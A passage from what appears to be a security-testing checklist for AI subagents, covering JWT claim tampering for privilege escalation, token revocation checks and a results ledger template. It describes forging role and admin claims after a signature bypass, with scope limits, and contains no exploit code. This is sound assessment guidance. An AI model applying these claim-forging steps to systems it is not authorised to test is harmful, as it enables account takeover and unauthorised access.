- **Refs:** https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter · `WSTG/10-Testing_JSON_Web_Tokens`

### SM-29 · Check JWT claim manipulation and privilege escalation — `CRITICAL`
Tags: `jwt` `claims` `privesc` · Subagent: SM-E

Only meaningful with a signing bypass (SM-22/23/24/27/28) **or** if the signature is not verified (SM-21). Modify `role`, `isAdmin`, `scope`, `groups`, `tenant`, `sub`. Prove with A's own `sub` and the least sensitive elevated endpoint; stop after one read.

- **Fail:** elevated claims honoured. Hand the forged session to `access-control` for impact mapping.
- **Refs:** https://portswigger.net/web-security/jwt · ASVS V3.5.3

### SM-30 · Test JWT revocation mechanism — `MEDIUM`
Tags: `jwt` `revocation` `logout` · Subagent: SM-E

Stateless JWTs remain valid until `exp` unless a denylist/`jti` store or short lifetime + refresh rotation exists. Re-run SM-05 (logout) and SM-08 (password change) specifically with the JWT access token and refresh token.

- **Fail:** access token remains valid long after logout/password change/account disable, with a long `exp`.
- **Pass:** short-lived access token (≤ 15 min typical) + revocable refresh token, or server-side denylist.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#no-built-in-token-revocation-by-the-user

---

## Ledger template (`artifacts/session/session_checklist_40.tsv`)

```
check_id	status	severity	finding_id	evidence_path	notes
SM-01							
SM-02							
...
SM-40							
```
